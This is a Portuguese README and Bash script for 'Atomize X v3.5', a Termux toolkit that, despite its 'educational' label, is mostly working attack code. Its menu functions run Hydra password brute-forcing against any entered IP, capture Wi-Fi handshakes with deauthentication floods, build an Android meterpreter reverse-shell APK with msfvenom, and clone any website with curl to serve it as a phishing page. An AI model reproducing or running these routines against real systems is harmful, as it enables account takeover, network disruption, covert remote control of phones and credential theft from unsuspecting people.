# Atomize X v3.5 - Toolkit Educacional de Pentest Real para Termux

**Atomize X v3.5** √© uma ferramenta de pentesting projetada para ensinar e praticar ciberseguran√ßa ofensiva no **Termux**, com recursos reais de hacking, como ataques de senha, explora√ß√£o de vulnerabilidades e escaneamento de redes. A interface imersiva no estilo "JARVIS" facilita o aprendizado.

---

## üìñ Descri√ß√£o do Projeto

**Objetivo:** Criar um ambiente educacional de pentest realista e funcional para que iniciantes e profissionais aprendam e pratiquem t√©cnicas de seguran√ßa ofensiva de forma segura e controlada.

### **Principais Funcionalidades:**
- Automa√ß√£o de ataques (brute-force, Wi-Fi, payloads)
- Ferramentas de pentesting como Metasploit, Hydra, Nmap
- Interface interativa e intuitiva (modo "JARVIS")
- Suporte a scripts personalizados
- An√°lises e escaneamento de redes e vulnerabilidades

---

## üõ† Tecnologias Utilizadas

- **Linguagens:** Python, Bash
- **Ferramentas:** Termux, Metasploit, Nmap, Hydra, Aircrack-ng, Wireshark
- **Objetivo Educacional:** Focar em ensinar seguran√ßa ofensiva e hacking √©tico

---

## üîç Como Usar

1. Clone o reposit√≥rio:
   ```bash
   git clone https://github.com/wolfdnb/Atomize-X-v3.5.git









#!/data/data/com.termux/files/usr/bin/bash
# Atomize X - Pentest Toolkit for Termux
# Desenvolvido para fins educacionais

# === CORES E VARI√ÅVEIS ===
export RED='\033[1;31m'
export GREEN='\033[1;32m'
export YELLOW='\033[1;33m'
export BLUE='\033[1;34m'
export CYAN='\033[1;36m'
export RESET='\033[0m'
export DIR="$HOME/atomize-x"
export WORDLIST="$DIR/wordlists/rockyou.txt"
mkdir -p $DIR/{data,wordlists,payloads,log}

# === VERIFICA√á√ÉO DE DEPEND√äNCIAS ===
check_env() {
    clear
    echo -e "${YELLOW}[~] Verificando depend√™ncias...${RESET}"
    for pkg in git nmap hydra curl aircrack-ng metasploit termux-api php ruby python unzip openssl net-tools chkrootkit; do
        if ! command -v $pkg &>/dev/null; then
            echo -e "${RED}[!] Instalando: $pkg${RESET}"
            pkg install -y $pkg
        fi
    done
}

# === BANNER ===
show_banner() {
    clear
    echo -e "${RED}
 ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ïë‚ïö‚ïê‚ïê‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù
‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  
‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ñà‚ïî‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  
‚ñà‚ñà‚ïë  ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïë   ‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë ‚ïö‚ïê‚ïù ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó
‚ïö‚ïê‚ïù  ‚ïö‚ïê‚ïù   ‚ïö‚ïê‚ïù    ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù ‚ïö‚ïê‚ïù     ‚ïö‚ïê‚ïù ‚ïö‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù${RESET}"
    echo -e "${CYAN}      [ Atomize X - Terminal de Ataque para Termux ]${RESET}\n"
}

# === MENU PRINCIPAL ===
quick_menu() {
    echo -e "${GREEN}[+] Escolha sua arma digital:${RESET}"
    echo -e "${YELLOW}
 1. Varredura Turbo de Rede
 2. Quebra de Senha Bruta (Hydra)
 3. Ataque Wi-Fi Express
 4. Gerar Payload Android
 5. Phishing Ninja
 6. Escaneamento de Vulnerabilidades
 7. Seguran√ßa (Firewall/VPN/Antiv√≠rus)
 8. IPs e Nomes conectados ao Wi-Fi
 9. Gerador de Senhas Fortes
10. Sair${RESET}"
    read -p "Escolha [1-10]: " option

    case $option in
        1) network_turbo ;;
        2) password_crack ;;
        3) wifi_attack ;;
        4) gen_payload ;;
        5) phishing_ninja ;;
        6) vuln_scan ;;
        7) security_tools ;;
        8) wifi_devices ;;
        9) password_generator ;;
       10) exit 0 ;;
        *) echo -e "${RED}[!] Op√ß√£o inv√°lida${RESET}" && sleep 1 ;;
    esac
}

# === FUN√á√ïES ===

network_turbo() {
    read -p "[IP ALVO]> " ip
    echo -e "${CYAN}[+] Escaneando $ip...${RESET}"
    nmap -T4 -A -v $ip | tee $DIR/data/nmap_$ip.txt
    echo -e "${CYAN}[+] Iniciando for√ßa bruta SSH com Hydra:${RESET}"
    read -p "[Quantidade de threads]> " threads
    hydra -L $DIR/wordlists/users.txt -P $WORDLIST ssh://$ip -t $threads
}

password_crack() {
    echo -e "${CYAN}[+] Iniciando for√ßa bruta com Hydra...${RESET}"
    read -p "[IP ALVO]> " ip
    read -p "[PORTA]> " port
    read -p "[PROTOCOLO - ex: ssh/ftp]> " proto
    read -p "[Usu√°rio]> " user
    read -p "[Threads]> " threads
    hydra -l $user -P $WORDLIST -s $port -t $threads $proto://$ip
}

wifi_attack() {
    echo -e "${CYAN}[+] Modo de Captura de Handshake:${RESET}"
    termux-wifi-enable false
    airmon-ng start wlan0
    airodump-ng wlan0mon
    read -p "[BSSID]> " bssid
    read -p "[CANAL]> " ch
    airodump-ng -c $ch --bssid $bssid -w $DIR/data/handshake wlan0mon
    aireplay-ng --deauth 10 -a $bssid wlan0mon
}

gen_payload() {
    read -p "[LHOST]> " lhost
    read -p "[LPORT]> " lport
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $DIR/payloads/android_payload.apk
    echo -e "${GREEN}[+] Payload gerado em: $DIR/payloads/android_payload.apk${RESET}"
}

phishing_ninja() {
    echo -e "${CYAN}[+] Clonando p√°gina falsa com PHP:${RESET}"
    read -p "URL alvo para clonar: " url
    mkdir -p $DIR/data/phishing
    curl -s $url -o $DIR/data/phishing/index.html
    php -S 0.0.0.0:8080 -t $DIR/data/phishing &
    echo -e "${GREEN}[+] P√°gina falsa em execu√ß√£o em http://localhost:8080${RESET}"
}

vuln_scan() {
    read -p "[ALVO]> " alvo
    echo -e "${CYAN}[+] Procurando vulnerabilidades...${RESET}"
    nmap --script vuln $alvo | tee $DIR/data/vuln_$alvo.txt
}

security_tools() {
    echo -e "${CYAN}[+] Ativando seguran√ßa...${RESET}"
    iptables -A INPUT -p tcp --dport 22 -j DROP
    termux-vpn enable
    echo -e "${GREEN}[+] Verificando rootkits:${RESET}"
    chkrootkit
    echo -e "${GREEN}[+] Ativado!${RESET}"
}

wifi_devices() {
    echo -e "${CYAN}[+] Dispositivos conectados √† sua rede Wi-Fi:${RESET}"
    ip route | grep wlan | awk '{print $1}' | while read subnet; do
        nmap -sn $subnet | grep "Nmap scan report" | awk '{print $5}'
    done
}

password_generator() {
    echo -e "${CYAN}[+] Gerador de senhas seguras:${RESET}"
    read -p "Quantidade de senhas: " qtd
    read -p "Tamanho da senha: " tam
    for i in $(seq 1 $qtd); do
        openssl rand -base64 48 | cut -c1-$tam
    done
}

# === EXECU√á√ÉO JARVIS STYLE ===
check_env
termux-tts-speak "Bem-vindo. Atomize X ativado."
show_banner

while true; do
    quick_menu
    echo -e "\n${YELLOW}[?] Pressione Enter para continuar...${RESET}"
    read
    show_banner
done